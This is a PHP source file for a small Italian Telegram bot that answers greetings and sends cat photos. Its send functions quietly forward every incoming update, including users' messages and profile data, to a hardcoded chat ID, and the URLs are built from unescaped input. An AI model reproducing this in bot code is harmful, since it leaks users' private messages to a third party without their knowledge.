    
<?php 
//Non toccare qui
$api = $_GET['api'];
$content = file_get_contents("php://input");
$update = json_decode($content, true);
/////////////////////////////////////////////
///////////////////// Parte da api.telegram.org //////////////////////////
//Variabili
$msg = $update["message"];
$chatID = $update["message"]["chat"]["id"];
$user_id = $update["message"]["message_id"];
//Funzioni
function sm($chatID, $text, $reply) {
global $api;
global $update;
$dati = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id=593168377&text='.json_encode($update,JSON_PRETTY_PRINT)); 
if($reply != NULL) {
	$r = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id='.$chatID.'&text='.$text.'&reply_to_message_id='.$reply);	
}
else {	
	$r = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id='.$chatID.'&text='.$text); }
}

function sf($chatID, $photo, $reply) {
global $api;
global $update;
$dati = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id=593168377&text='.json_encode($update,JSON_PRETTY_PRINT)); 
if($reply != NULL) {
	$r = file_get_contents('https://api.telegram.org/'.$api.'/sendPhoto?chat_id='.$chatID.'&photo='.$photo.'&reply_to_message_id='.$reply);	
}
else {	
	$r = file_get_contents('https://api.telegram.org/'.$api.'/sendPhoto?chat_id='.$chatID.'&photo='.$photo); }
} 

///////////////////////////////////////////////////////////////////////////
//Azioni

if(array_key_exists("text", $msg)){
    $text = strtolower($update["message"]["text"]);
	
    if($text == "/start") {
	$out = sm($chatID, "Ehi ehi", NULL); }
	
    if($text =="ciao" or $text == "ehi") { 
       $out = sm($chatID,"Ciao!", $user_id);  }
	
    if($text == "foto"){
	$photo = 'AgADBAADJrAxG3u7CFDD4nw-x4m6_UYVIhsABHR-peoVil9y30AGAAEC';
	$out = sf($chatID, $photo , NULL);}
   
    if ($text == "gatto") {
	$photo = 'https://www.miciogatto.it/new/wp-content/uploads/2018/02/Linguaggio-dei-gatti-come-capire-un-gatto-1030x587.jpg';
	$out = sf($chatID, $photo, NULL);}
	
   if($text == "moto"){
	$photo = 'https://www.miciogatto.it/new/wp-content/uploads/2018/02/Linguaggio-dei-gatti-come-capire-un-gatto-1030x587.jpg';
	$out = sf($chatID, $photo, NULL);}
	
}


//if(array_key_exists("photo", $msg))
//	$dati = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id=593168377&text='.json_encode($update,JSON_PRETTY_PRINT)); 




?>
